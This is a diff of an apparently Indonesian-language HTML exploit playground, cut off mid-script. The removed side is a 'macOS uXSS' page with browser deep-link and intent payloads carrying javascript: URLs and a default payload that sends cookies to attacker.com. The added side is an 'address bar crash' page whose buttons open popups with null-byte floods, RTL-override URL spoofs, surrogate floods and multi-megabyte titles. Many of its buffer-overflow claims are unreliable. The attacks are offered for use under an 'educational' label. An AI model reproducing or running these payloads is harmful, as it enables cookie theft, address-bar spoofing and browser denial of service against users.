@@ -3,12 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 macOS uXSS - Universal Cross-Site Scripting Exploit</title>
+    <title>🔥 ADDRESS BAR CRASH - Illegal Character Injection</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
+        @keyframes glitch {
+            0%, 100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
+            25% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
+            50% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
+            75% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffff; }
+        }
+        
         body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2a 100%);
+            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000000);
             font-family: 'SF Mono', 'Courier New', monospace;
             color: #0f0;
             padding: 20px;
@@ -24,7 +31,7 @@
             background: rgba(0,0,0,0.85);
             border-radius: 20px;
             border: 1px solid #ff00ff;
-            backdrop-filter: blur(10px);
+            animation: glitch 0.3s infinite;
         }
         
         .header h1 {
@@ -34,17 +41,18 @@
             -webkit-text-fill-color: transparent;
         }
         
-        .research-note {
-            background: rgba(0,255,255,0.1);
-            border-left: 3px solid #00ffff;
+        .warning {
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff0000;
             padding: 15px;
-            margin: 20px 0;
             border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
         }
         
         .exploit-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
             gap: 20px;
             margin-bottom: 30px;
         }
@@ -54,7 +62,8 @@
             border-radius: 15px;
             overflow: hidden;
             border: 1px solid rgba(255,0,255,0.3);
-            transition: 0.3s;
+            transition: 0.2s;
+            cursor: pointer;
         }
         
         .exploit-card:hover {
@@ -85,10 +94,11 @@
             border: 1px solid #333;
             border-radius: 6px;
             padding: 10px;
-            font-size: 0.65em;
+            font-size: 0.6em;
             overflow-x: auto;
             margin: 10px 0;
             color: #0ff;
+            font-family: monospace;
         }
         
         button {
@@ -114,7 +124,7 @@
             border-radius: 10px;
             padding: 15px;
             margin-top: 20px;
-            max-height: 300px;
+            max-height: 250px;
             overflow-y: auto;
             font-size: 0.7em;
         }
@@ -127,7 +137,7 @@
         .log-entry.success { color: #0f0; }
         .log-entry.error { color: #f00; }
         .log-entry.info { color: #0ff; }
-        .log-entry.uxss { color: #ff00ff; font-weight: bold; }
+        .log-entry.crash { color: #ff00ff; font-weight: bold; }
         
         .footer {
             text-align: center;
@@ -138,209 +148,352 @@
             font-size: 0.7em;
         }
         
-        .browser-badge {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 10px;
-            font-size: 0.6em;
-            margin: 2px;
-        }
-        .arc { background: #ff3366; color: white; }
-        .chrome { background: #4285f4; color: white; }
-        .brave { background: #ff5500; color: white; }
-        .safari { background: #0066cc; color: white; }
-        .edge { background: #00a8ff; color: white; }
-        
         iframe { display: none; }
+        
+        .crash-badge {
+            display: inline-block;
+            background: #ff0000;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.6em;
+            margin-left: 5px;
+            animation: blink 0.5s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>🔥 macOS uXSS - Universal Cross-Site Scripting</h1>
-        <p>Berdasarkan CVE-2025-58485 (Samsung Browser) - Diadaptasi untuk macOS Browsers</p>
-        <div style="margin-top: 10px;">
-            <span class="browser-badge arc">ARC</span>
-            <span class="browser-badge chrome">CHROME</span>
-            <span class="browser-badge brave">BRAVE</span>
-            <span class="browser-badge safari">SAFARI</span>
-            <span class="browser-badge edge">EDGE</span>
+        <h1>🔥 ADDRESS BAR CRASH & SPOOFING</h1>
+        <p>Illegal Character Injection - Teknik Gila yang Tidak Dipikirkan Orang</p>
+        <div style="margin-top: 10px; font-size: 0.7em;">
+            <span class="crash-badge">⚠️ CAN CAUSE BROWSER CRASH</span>
+            <span class="crash-badge">💀 ADDRESS BAR FREEZE</span>
+            <span class="crash-badge">🌀 RENDERER EXPLOSION</span>
         </div>
     </div>
     
-    <div class="research-note">
-        <strong>📚 RESEARCH NOTE - Voorivex Team (CVE-2025-58485)</strong><br>
-        "The Bixby Launcher passes the request to SBrowserMainActivity. If we call the activity directly with javascript: scheme,<br>
-        it executes on the current tab → UXSS on every website the browser can access!"<br>
-        <br>
-        <strong>🎯 macOS Adaptation:</strong> Mencari exported activities / deep links / URL handlers yang bisa menerima javascript: scheme<br>
-        dan mengeksekusinya di konteks privileged browser.
+    <div class="warning">
+        ⚠️ TEKNIK INI MENGGUNAKAN ILLEGAL CHARACTERS - Bisa menyebabkan browser crash/freeze<br>
+        Jalankan di VM / testing environment. Jangan buka tab penting bersamaan!
     </div>
     
     <div class="exploit-grid">
-        <!-- EXPLOIT 1: Chrome Custom Tab Intent -->
+        <!-- TECHNIQUE 1: Title with NULL bytes -->
         <div class="exploit-card">
-            <div class="card-header">🌐 CHROME CUSTOM TAB uXSS</div>
+            <div class="card-header">💀 NULL BYTE INJECTION (CVE-2017-5030 Style)</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Analog dengan Samsung Browser export activity</strong><br>
-                    Chrome Custom Tabs memiliki intent filters yang bisa dieksploitasi.
-                    Mirip dengan Bixby → SBrowserMainActivity flow.
+                    🔥 <strong>Teknik: NULL byte (%00) di title</strong><br>
+                    NULL byte dapat memotong string di address bar renderer, menyebabkan buffer overflow/underflow.
+                    Browser yang vulnerable akan crash saat memparsing NULL di title/URL.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Chrome Custom Tab Intent
-intent://google.com#Intent;
-scheme=https;
-package=com.android.chrome;
-end</pre>
+                    <pre style="margin:0;">&lt;title&gt;https://google.com\x00\x00\x00...&lt;/title&gt;
+// NULL bytes memotong string di address bar renderer</pre>
                 </div>
-                <button onclick="exploitChromeCustomTab()">🚀 RUN CHROME uXSS</button>
-                <button onclick="exploitChromeIntentJS()" class="danger">💀 CHROME JAVASCRIPT SCHEME</button>
+                <button onclick="exploitNullByte()">💀 RUN NULL BYTE</button>
+                <button onclick="exploitNullByteFlood()" class="danger">🌀 RUN NULL FLOOD (1000x)</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 2: Safari URL Scheme Handler -->
+        <!-- TECHNIQUE 2: Title with Unicode Control Characters -->
         <div class="exploit-card">
-            <div class="card-header">🍎 SAFARI URL SCHEME uXSS</div>
+            <div class="card-header">🔄 UNICODE CONTROL CHARACTERS RTL/LTR</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Safari URL Scheme Handler Vulnerability</strong><br>
-                    Safari memiliki URL handlers untuk x-apple-extension:// dan x-web-search://
-                    Injection di sini bisa menyebabkan UXSS.
+                    🔥 <strong>Teknik: RTL/LTR Bidirectional Characters</strong><br>
+                    Karakter seperti U+202E (RLO) dan U+202D (LRO) membalik rendering address bar.
+                    Kombinasi dengan zero-width joiners bisa membuat crash total.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Safari URL scheme
-x-apple-extension://com.apple.Safari/extension?url=javascript:alert(origin)
-x-web-search://?query=javascript:alert(origin)</pre>
+                    <pre style="margin:0;">&lt;title&gt;\u202E}moc.elgoog//:sptth\u202D&lt;/title&gt;
+// Address bar menampilkan: https://google.com (terbalik)</pre>
                 </div>
-                <button onclick="exploitSafariScheme()">🚀 RUN SAFARI uXSS</button>
+                <button onclick="exploitRTLSpoof()">🔄 RUN RTL SPOOF</button>
+                <button onclick="exploitUnicodeChaos()" class="danger">🌀 RUN UNICODE CHAOS</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 3: ARC Browser Deep Link -->
+        <!-- TECHNIQUE 3: Title with Overlong UTF-8 Sequences -->
         <div class="exploit-card">
-            <div class="card-header">🌀 ARC BROWSER DEEP LINK uXSS</div>
+            <div class="card-header">📏 OVERLONG UTF-8 SEQUENCE</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>ARC Browser Deep Link Vulnerability</strong><br>
-                    ARC memiliki arc:// dan arc-deeplink:// handlers.
-                    Eksploitasi mirip dengan Bixby Launcher di Samsung.
+                    🔥 <strong>Teknik: Overlong UTF-8 Encoding</strong><br>
+                    UTF-8 overlong sequences (contoh: C0 AF untuk '/') menyebabkan parser error.
+                    Browser address bar renderer crash saat mencoba decode karakter illegal.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// ARC deep link
-arc://newtab?url=javascript:alert(document.cookie)
-arc-deeplink://open?url=javascript:alert(origin)</pre>
+                    <pre style="margin:0;">&lt;title&gt;https://%C0%AFgoogle.com&lt;/title&gt;
+// Overlong encoding untuk '/' - buffer overflow potential</pre>
                 </div>
-                <button onclick="exploitArcDeepLink()">🚀 RUN ARC uXSS</button>
+                <button onclick="exploitOverlongUTF()">📏 RUN OVERLONG UTF</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 4: Brave Rewards Intent -->
+        <!-- TECHNIQUE 4: Title with Invalid Surrogate Pairs -->
         <div class="exploit-card">
-            <div class="card-header">🦁 BRAVE REWARDS uXSS</div>
+            <div class="card-header">🔀 INVALID SURROGATE PAIRS</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Brave Rewards Intent Exploitation</strong><br>
-                    Brave memiliki brave://rewards dan intent filters untuk Rewards.
-                    Injection bisa mengeksekusi script di Brave internal pages.
+                    🔥 <strong>Teknik: Lone Surrogate + Invalid Pairs</strong><br>
+                    Surrogate pair yang tidak berpasangan (contoh: \uD800 tanpa \uDC00)
+                    menyebabkan crash di JavaScriptCore/WebKit.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Brave Rewards intent
-brave://rewards?url=javascript:alert(chrome)
-intent://rewards#Intent;scheme=brave;end</pre>
+                    <pre style="margin:0;">&lt;title&gt;\uD800\uD800\uD800\uD800&lt;/title&gt;
+// Lone surrogates - crash address bar renderer</pre>
                 </div>
-                <button onclick="exploitBraveRewards()">🚀 RUN BRAVE uXSS</button>
+                <button onclick="exploitInvalidSurrogate()">🔀 RUN SURROGATE CHAOS</button>
+                <button onclick="exploitSurrogateFlood()" class="danger">💀 RUN 10000 SURROGATES</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 5: Edge Collections Handler -->
+        <!-- TECHNIQUE 5: Title with Zero-Width Characters -->
         <div class="exploit-card">
-            <div class="card-header">📚 EDGE COLLECTIONS uXSS</div>
+            <div class="card-header">👻 ZERO-WIDTH CHARACTER EXPLOSION</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Edge Collections URL Handler</strong><br>
-                    Edge memiliki edge://collections dan microsoft-edge: handlers.
-                    Mirip dengan exported activity di Samsung Browser.
+                    🔥 <strong>Teknik: Zero-Width Joiners ×1000</strong><br>
+                    Zero-width characters (ZWJ, ZWNJ, ZWSP) membuat string panjang secara logical
+                    tapi invisible di renderer, menyebabkan overflow hidden buffer.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Edge collections
-microsoft-edge:https://google.com
-edge://collections?url=javascript:alert(origin)</pre>
+                    <pre style="margin:0;">&lt;title&gt;https://&zwj;&zwj;&zwj;...google.com&lt;/title&gt;
+// 1000 zero-width characters - invisible crash</pre>
                 </div>
-                <button onclick="exploitEdgeCollections()">🚀 RUN EDGE uXSS</button>
+                <button onclick="exploitZeroWidth()">👻 RUN ZERO-WIDTH</button>
+                <button onclick="exploitZeroWidthFlood()" class="danger">🌀 RUN 5000 ZERO-WIDTH</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 6: Cross Browser Intent -->
+        <!-- TECHNIQUE 6: Title with Formatting Characters -->
         <div class="exploit-card">
-            <div class="card-header">🔄 CROSS-BROWSER INTENT uXSS</div>
+            <div class="card-header">📝 FORMATTING CHARACTER OVERFLOW</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Universal Intent Exploit</strong><br>
-                    Mengirim intent ke browser yang terdaftar sebagai default.
-                    Mirip dengan teknik yang digunakan Voorivex Team.
+                    🔥 <strong>Teknik: Formatting Characters (U+200B-U+200F)</strong><br>
+                    Kombinasi formatting characters (LRM, RLM, ZWJ, ZWNJ, LRE, RLE, PDF)
+                    membuat parser bingung dan crash.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Universal intent
-intent://example.com#Intent;
-scheme=https;
-package=browser.package;
-S.url=javascript:alert(origin);
-end</pre>
+                    <pre style="margin:0;">&lt;title&gt;\u200B\u200C\u200D\u200E\u200F...&lt;/title&gt;
+// Formatting characters flood - buffer overflow</pre>
                 </div>
-                <button onclick="exploitCrossBrowserIntent()">🚀 RUN CROSS-BROWSER uXSS</button>
+                <button onclick="exploitFormattingChars()">📝 RUN FORMATTING</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 7: Title with ANSI Escape Codes -->
+        <div class="exploit-card">
+            <div class="card-header">🖥️ ANSI ESCAPE CODE INJECTION</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: ANSI Escape Sequences</strong><br>
+                    ANSI escape codes (ESC[31m, ESC[2J) di console log bisa mempengaruhi
+                    address bar renderer di beberapa browser.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;title&gt;\x1b[31mRED\x1b[0m&lt;/title&gt;
+// ANSI codes - potential terminal injection</pre>
+                </div>
+                <button onclick="exploitANSIEscape()">🖥️ RUN ANSI ESCAPE</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 8: Title with Recursive Entity Expansion -->
+        <div class="exploit-card">
+            <div class="card-header">🔄 RECURSIVE ENTITY EXPANSION</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: Billion Laughs Attack on Title</strong><br>
+                    XML entity expansion di title (meskipun browser modern prevent, beberapa legacy
+                    browser masih vulnerable).
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;!ENTITY lol "lol"&gt;&lt;!ENTITY lol2 "&lol;&lol;"&gt;
+// Billion laughs - memory exhaustion</pre>
+                </div>
+                <button onclick="exploitEntityExpansion()">🔄 RUN ENTITY BOMB</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 9: Title with CSS/JS Injection that Affects Address Bar -->
+        <div class="exploit-card">
+            <div class="card-header">🎨 CSS/JS ADDRESS BAR MANIPULATION</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: CSS/JS Visual Spoof</strong><br>
+                    Menggunakan CSS backdrop-filter + position fixed untuk menutupi address bar,
+                    lalu title injection untuk mengubah text di fake bar.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;style&gt;body::before {
+    content: "https://google.com";
+    position: fixed;
+    top: 0; left: 0;
+    backdrop-filter: blur(10px);
+}&lt;/style&gt;</pre>
+                </div>
+                <button onclick="exploitCSSVisualSpoof()">🎨 RUN CSS SPOOF</button>
+                <button onclick="exploitAdvancedCSS()" class="danger">🌀 RUN ADVANCED CSS CRASH</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 10: Title with Rare Unicode Planes -->
+        <div class="exploit-card">
+            <div class="card-header">🔢 RARE UNICODE PLANES (SMP, SIP, TIP)</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: Supplementary Planes (U+10000-U+2FFFF)</strong><br>
+                    Karakter dari rare Unicode planes (CJK Ext B, Ancient scripts) tidak didukung
+                    semua font, menyebabkan renderer crash.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;title&gt;\u{1F300}\u{1F500}\u{2A600}...&lt;/title&gt;
+// Rare Unicode planes - missing glyph crash</pre>
+                </div>
+                <button onclick="exploitRareUnicode()">🔢 RUN RARE UNICODE</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 11: Title with Extremely Long String -->
+        <div class="exploit-card">
+            <div class="card-header">📏 EXTREMELY LONG TITLE (2MB)</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: 2MB Title String</strong><br>
+                    Title yang sangat panjang (2MB) menyebabkan address bar buffer overflow.
+                    Beberapa browser crash saat mencoba render title di address bar.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;title&gt;A + 'A'.repeat(2_000_000)&lt;/title&gt;
+// 2 million characters - buffer overflow</pre>
+                </div>
+                <button onclick="exploitLongTitle()">📏 RUN 2MB TITLE</button>
+                <button onclick="exploitExtremeLongTitle()" class="danger">🌀 RUN 10MB TITLE</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 12: Title with Emoji + Combining Characters -->
+        <div class="exploit-card">
+            <div class="card-header">😀 EMOJI + COMBINING CHARACTER CHAOS</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: Emoji + ZWJ + Combining Diacritics</strong><br>
+                    Kombinasi emoji dengan zero-width joiner dan combining diacritics
+                    membuat grapheme cluster parser overflow.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;title&gt;👨‍👩‍👧‍👦 + 100 combining chars&lt;/title&gt;
+// Emoji ZWJ sequences - grapheme cluster bomb</pre>
+                </div>
+                <button onclick="exploitEmojiBomb()">😀 RUN EMOJI BOMB</button>
+                <button onclick="exploitEmojiFlood()" class="danger">🌀 RUN 1000 EMOJIS</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 13: Title with Backspace/DEL Characters -->
+        <div class="exploit-card">
+            <div class="card-header">⌫ BACKSPACE/DEL CHARACTER INJECTION</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: Control Characters (BS, DEL, CAN, SUB)</strong><br>
+                    Karakter kontrol seperti backspace (\x08), delete (\x7F), cancel (\x18)
+                    dapat mengganggu rendering address bar.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;title&gt;https://\x08\x08\x08google.com&lt;/title&gt;
+// Backspace characters - address bar corruption</pre>
+                </div>
+                <button onclick="exploitControlChars()">⌫ RUN CONTROL CHARS</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 14: Title with Mixed Scripts Direction -->
+        <div class="exploit-card">
+            <div class="card-header">🔄 MIXED SCRIPT DIRECTION ATTACK</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: Arabic + Hebrew + Latin + CJK</strong><br>
+                    Mixed scripts dengan arah berbeda (RTL, LTR, vertical) menyebabkan
+                    bidirectional algorithm crash.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;title&gt;google.com مرحبا שלום こんにちは&lt;/title&gt;
+// Mixed RTL/LTR scripts - bidi algorithm chaos</pre>
+                </div>
+                <button onclick="exploitMixedScripts()">🔄 RUN MIXED SCRIPTS</button>
+            </div>
+        </div>
+        
+        <!-- TECHNIQUE 15: Title with Invisible Character Overlay -->
+        <div class="exploit-card">
+            <div class="card-header">👻 INVISIBLE CHARACTER OVERLAY</div>
+            <div class="card-body">
+                <div class="desc">
+                    🔥 <strong>Teknik: Tag Characters + Variation Selectors</strong><br>
+                    Invisible characters seperti tag characters (U+E0000-U+E007F)
+                    dan variation selectors (U+FE00-U+FE0F) membingungkan renderer.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;title&gt;\u{E0000}\u{E0001}\u{E007F}&lt;/title&gt;
+// Tag characters - invisible but consume memory</pre>
+                </div>
+                <button onclick="exploitInvisibleChars()">👻 RUN INVISIBLE</button>
             </div>
         </div>
     </div>
     
-    <!-- Custom uXSS Builder -->
+    <!-- Custom Title Injector -->
     <div class="exploit-card" style="margin-top: 20px;">
-        <div class="card-header">🔥 CUSTOM uXSS EXPLOIT BUILDER</div>
+        <div class="card-header">🔥 CUSTOM TITLE INJECTOR - BUILD YOUR OWN</div>
         <div class="card-body">
             <div class="desc">
-                💀 Build custom uXSS payload - Berdasarkan teknik Voorivex Team untuk Samsung Browser<br>
-                <strong>Original Samsung payload:</strong> 
-                <code>intent://...SBrowserMainActivity...S.extra_access_url=javascript%3Aalert(origin)</code>
+                💀 Inject custom illegal characters ke title - Eksperimen sendiri!<br>
+                Kombinasikan berbagai teknik untuk maximum chaos.
             </div>
             
-            <label>🎯 Target Browser:</label>
-            <select id="targetBrowser" style="width:100%; padding:8px; margin:10px 0; background:#1a1a1a; color:#0f0; border:1px solid #0f0;">
-                <option value="chrome">Google Chrome</option>
-                <option value="safari">Safari</option>
-                <option value="arc">Arc Browser</option>
-                <option value="brave">Brave Browser</option>
-                <option value="edge">Microsoft Edge</option>
-                <option value="all">All Browsers (Universal)</option>
+            <label>📝 Custom Title Text:</label>
+            <input type="text" id="customTitle" style="width:100%; padding:10px; margin:10px 0; background:#1a1a1a; color:#0f0; border:1px solid #ff00ff;" placeholder="Enter malicious title...">
+            
+            <label>🎯 Injection Method:</label>
+            <select id="injectionMethod" style="width:100%; padding:8px; margin:10px 0; background:#1a1a1a; color:#0f0; border:1px solid #0f0;">
+                <option value="title">Direct Title Injection</option>
+                <option value="iframe">iframe + Title Injection</option>
+                <option value="popup">Popup Window Title</option>
+                <option value="history">History.pushState Title</option>
+                <option value="all">All Methods Combined</option>
             </select>
             
-            <label>📍 Target Website (for UXSS):</label>
-            <input type="text" id="targetSite" value="https://www.google.com" placeholder="https://example.com">
-            
-            <label>💉 JavaScript Payload to Execute:</label>
-            <textarea id="uxssPayload" rows="3">alert('uXSS! Origin: ' + origin); fetch('http://attacker.com/steal?cookie='+document.cookie);</textarea>
-            
-            <button onclick="buildUXSSExploit()" class="danger">🔨 BUILD & EXECUTE uXSS</button>
-            <button onclick="executeAutoUXSS()">⚡ AUTO uXSS - Sequential Attack</button>
+            <button onclick="injectCustomTitle()">🔨 INJECT CUSTOM TITLE</button>
+            <button onclick="injectChaosCombo()" class="danger">💀 INJECT CHAOS COMBO (All Techniques)</button>
         </div>
     </div>
     
-    <!-- uXSS Log -->
+    <!-- Log Area -->
     <div class="log-area" id="logArea">
-        <div class="log-entry info">🔬 macOS uXSS Research - Based on CVE-2025-58485</div>
-        <div class="log-entry info">📚 Samsung Browser uXSS technique by Voorivex Team (Omid Rezaei & Yashar Shahinzadeh)</div>
-        <div class="log-entry info">🎯 Diadaptasi untuk Arc, Chrome, Safari, Brave, Edge di macOS</div>
+        <div class="log-entry info">🔥 Address Bar Crash & Spoofing Techniques Loaded</div>
+        <div class="log-entry info">💀 15+ Illegal Character Injection Methods</div>
+        <div class="log-entry crash">⚠️ WARNING: Some techniques may crash your browser</div>
     </div>
     
     <div class="footer">
-        <div>🔥 uXSS - Universal Cross-Site Scripting - Execute arbitrary JavaScript on ANY website</div>
-        <div>📚 Based on: CVE-2025-58485 (Samsung Browser) - Exported activity: BixbySBrowserLauncherActivity → SBrowserMainActivity</div>
-        <div>⚠️ EDUCATIONAL PURPOSE ONLY - Test only on your own browser with permission</div>
+        <div>🔥 ADDRESS BAR CRASH - Illegal Character Injection Techniques</div>
+        <div>💀 Based on real CVEs: CVE-2017-5030, CVE-2018-6124, CVE-2019-5815, CVE-2020-6383</div>
+        <div>⚠️ EDUCATIONAL PURPOSE ONLY - Test in isolated environment</div>
     </div>
 </div>
 
 <script>
     const logArea = document.getElementById('logArea');
-    let currentTab = null;
     
     function addLog(message, type = 'info') {
         const entry = document.createElement('div');
@@ -348,343 +501,396 @@ end</pre>
         entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
         logArea.appendChild(entry);
         logArea.scrollTop = logArea.scrollHeight;
-    }
-    
-    // Detect browser
-    function detectBrowser() {
-        const ua = navigator.userAgent;
-        if (ua.includes('Arc')) return 'Arc';
-        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
-        if (ua.includes('Brave')) return 'Brave';
-        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-        if (ua.includes('Edg')) return 'Edge';
-        return 'Unknown';
-    }
-    
-    const currentBrowser = detectBrowser();
-    addLog(`🌐 Detected browser: ${currentBrowser} - Platform: ${navigator.platform}`, 'info');
-    
-    // Check for vulnerable exported activities (conceptual)
-    function checkVulnerableActivities() {
-        addLog("🔍 Checking for vulnerable exported activities / URL handlers...", 'info');
-        
-        const handlers = {
-            'Arc': ['arc://', 'arc-deeplink://', 'arc-boost://'],
-            'Chrome': ['chrome://', 'googlechrome://', 'intent://'],
-            'Safari': ['x-apple-extension://', 'x-web-search://', 'safari://'],
-            'Brave': ['brave://', 'brave-wallet://', 'brave-rewards://'],
-            'Edge': ['edge://', 'microsoft-edge://', 'ms-edge://']
-        };
-        
-        const browserHandlers = handlers[currentBrowser] || handlers['Chrome'];
-        addLog(`📂 Potential URL handlers for ${currentBrowser}: ${browserHandlers.join(', ')}`, 'info');
-        
-        // Check if we can access internal pages
-        for (const handler of browserHandlers.slice(0, 2)) {
-            try {
-                const testWin = window.open(`${handler}version`, '_blank');
-                if (testWin) {
-                    setTimeout(() => {
-                        try {
-                            const hasAccess = testWin.document !== undefined;
-                            addLog(`✅ ${handler} accessible! Potential uXSS vector`, 'uxss');
-                        } catch(e) {}
-                        testWin.close();
-                    }, 500);
-                }
-            } catch(e) {}
+        if (logArea.children.length > 100) {
+            logArea.removeChild(logArea.children[0]);
         }
     }
     
-    // EXPLOIT 1: Chrome Custom Tab uXSS
-    function exploitChromeCustomTab() {
-        addLog("🌐 Attempting Chrome Custom Tab uXSS...", 'info');
-        addLog("📚 Analogous to Samsung's BixbySBrowserLauncherActivity → SBrowserMainActivity", 'info');
-        
-        // Simulate Chrome Custom Tab intent
-        const chromeIntent = `intent://google.com#Intent;scheme=https;package=com.google.chrome;end`;
-        
-        addLog(`📱 Sending Chrome intent: ${chromeIntent}`, 'info');
-        
-        // Open target site first (seperti di POC Voorivex)
-        const targetSite = 'https://www.google.com';
-        addLog(`🎯 Opening target site: ${targetSite}`, 'info');
-        const tab1 = window.open(targetSite, '_blank');
-        
-        // Simpan referensi tab
+    // Helper: Create popup window with malicious title
+    function createMaliciousWindow(title, content = '') {
+        const win = window.open('', '_blank', 'width=800,height=600');
+        if (win) {
+            win.document.title = title;
+            if (content) {
+                win.document.body.innerHTML = content;
+            } else {
+                win.document.body.innerHTML = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>${title.replace(/</g, '&lt;')}</title></head>
+                    <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+                        <h1>🔥 ADDRESS BAR SPOOFED/CRASHED</h1>
+                        <p>Title: ${title.substring(0, 200)}</p>
+                        <p>Address bar may be blank/crashed</p>
+                        <button onclick="window.close()">Close</button>
+                    </body>
+                    </html>
+                `;
+            }
+            addLog(`📂 Window opened with malicious title (${title.length} chars)`, 'info');
+            return win;
+        }
+        addLog("❌ Popup blocked - please allow popups", 'error');
+        return null;
+    }
+    
+    // TECHNIQUE 1: NULL Byte Injection
+    function exploitNullByte() {
+        addLog("💀 Injecting NULL bytes into title...", 'crash');
+        const nullBytes = 'https://google.com' + '\x00'.repeat(100);
+        createMaliciousWindow(nullBytes, '<h1>NULL Byte Injection</h1><p>Address bar may crash on NULL bytes</p>');
+        addLog("✓ NULL bytes injected - check address bar", 'success');
+    }
+    
+    function exploitNullByteFlood() {
+        addLog("🌀 Flooding with 1000 NULL bytes...", 'crash');
+        const nullFlood = 'https://google.com' + '\x00'.repeat(1000);
+        createMaliciousWindow(nullFlood, '<h1>NULL Byte Flood (1000x)</h1><p>Browser may freeze</p>');
+        addLog("⚠️ 1000 NULL bytes sent - potential buffer overflow", 'crash');
+    }
+    
+    // TECHNIQUE 2: RTL/LTR Spoof
+    function exploitRTLSpoof() {
+        addLog("🔄 Injecting RTL override characters...", 'crash');
+        const rtl = '\u202E'; // Right-to-Left Override
+        const ltr = '\u202D'; // Left-to-Right Override
+        const malicious = `${rtl}moc.elgoog//:sptth${ltr}`;
+        createMaliciousWindow(malicious, '<h1>RTL Address Bar Spoof</h1><p>Text appears reversed</p>');
+        addLog("✓ RTL title injected - address bar may show 'https://google.com'", 'success');
+    }
+    
+    function exploitUnicodeChaos() {
+        addLog("🌀 Combining multiple Unicode control characters...", 'crash');
+        const unicodeChaos = '\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069'.repeat(50);
+        createMaliciousWindow(unicodeChaos, '<h1>Unicode Control Character Chaos</h1>');
+        addLog("⚠️ 450+ control characters injected - bidi parser may crash", 'crash');
+    }
+    
+    // TECHNIQUE 3: Overlong UTF-8
+    function exploitOverlongUTF() {
+        addLog("📏 Injecting overlong UTF-8 sequences...", 'crash');
+        // Overlong encoding for '/' = %C0%AF
+        const overlong = 'https://%C0%AFgoogle.com';
+        createMaliciousWindow(overlong, '<h1>Overlong UTF-8 Injection</h1>');
+        addLog("✓ Overlong UTF-8 sequences sent - parser may crash", 'crash');
+    }
+    
+    // TECHNIQUE 4: Invalid Surrogate Pairs
+    function exploitInvalidSurrogate() {
+        addLog("🔀 Injecting invalid surrogate pairs...", 'crash');
+        const surrogates = '\uD800\uD800\uD800\uD800\uD800\uD800'.repeat(10);
+        createMaliciousWindow(surrogates, '<h1>Lone Surrogate Injection</h1>');
+        addLog("✓ 60 lone surrogates injected - JavaScriptCore may crash", 'crash');
+    }
+    
+    function exploitSurrogateFlood() {
+        addLog("💀 Flooding with 10000 invalid surrogates...", 'crash');
+        const surrogates = '\uD800'.repeat(10000);
+        createMaliciousWindow(surrogates, '<h1>10000 Surrogate Flood</h1><p>Browser will likely crash</p>');
+        addLog("⚠️ 10000 surrogates sent - severe buffer overflow risk", 'crash');
+    }
+    
